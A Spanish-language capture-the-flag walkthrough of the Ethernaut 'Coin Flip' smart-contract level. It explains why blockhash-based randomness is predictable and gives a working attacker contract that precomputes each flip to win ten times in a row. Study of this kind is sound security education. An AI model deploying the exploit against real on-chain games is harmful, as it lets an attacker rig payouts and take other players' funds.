# 3-Coin Flip

## Objetivo
Predecir 10 veces seguidas la cara de la moneda

## Contrato
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```
## Análisis del contrato
* Puede ser compilado con una versión 0.6.0 o superior de Solidity.
* Importa la librería SafeMath de OpenZeppeling por lo que sabemos que las operaciones aritméticas es poco probable que fallen.
* Posee tres variables **_uint256_** consecutiveWins, lastHash y FACTOR a la cual se le asigna un valor fijo.
* El constructor, setea en 0 la variable consecutiveWins
* Función Flip, es pública, recibe como parámetro un booleano y devuelve un booleano.</br>
Esta función toma el valor del bloque actual a la cual se agrega la transacción, se le resta una unidad, y se le aplica un función de hash el resultado es 
almacenado en la variable blockValue.</br>
Luego valida si el último hash generado es igual al hash que se acaba de generar, si es igual quiere decir que no se generó un nuevo bloque
y la transacción se revierte. En caso de que no sean iguales, se guarda este hash en la variable lastHash, la variable blockValue se divide por la variable FACTOR y
el resultado se guarda en la variable coinFlip.</br>
Si coinFlip es igual a 1, la variable side almacena true de lo contrario almacena false.
Luego valida si la variable side es igual al parámetro guess recibida por parámetro. Si son iguales suma 1 a la cantidad de victorias consecutivas, de lo contrario,
le asigna 0.

## Solución
Dos cosas a tener en cuenta: 
1. En las divisiones en Solidity se redondea para 0, es decir que si dividimos 1/2 el resultado será 0.
2. En solidity no existe forma nativa de generar un número realmente aleatorio, ya que tanto el código como las variables son visibles al público.
Los bloques y timestamps también, por lo que los mineros pueden manipular estas variables para agregar o no una transacción en cierto bloque.

Por lo que la solución es utilizar parte del código del contrato original, para predecir cuál será el valor del giro de la moneda.
Para esto, vamos a crear un contrato que llamará a la función del contrato original con el valor correcto de tal forma de no fallar.

### Contrato Hack
```Solidity
contract hackCoinFlip{

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public originalContract = CoinFlip({{address de tu contrato coinFlip}});

    function hackGuess() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flip = blockValue/FACTOR;
        bool side = flip == 1 ? true : false;
        originalContract.flip(side);
    }
}
```
El contrato **_hackCoinFlip_**, lo que hace es realizar el mismo proceso que el contrato original y una vez que posee el valor correcto, llama a la función flip del contrato original
con este valor.</br>
Este contrato lo podemos deployar utilizando [Remix](https://remix.ethereum.org/), una vez deployado llamamos a la función hackGuess unas 10 veces manualmente.</br>
Pueden vaidar cómo el valor de consecutiveWins va aumentando con cada llamada a la función hackGuess.

Una vez realizados los 10 lanzamientos, realizamos el submit de la instancia y listo!. Cuarto reto completado.
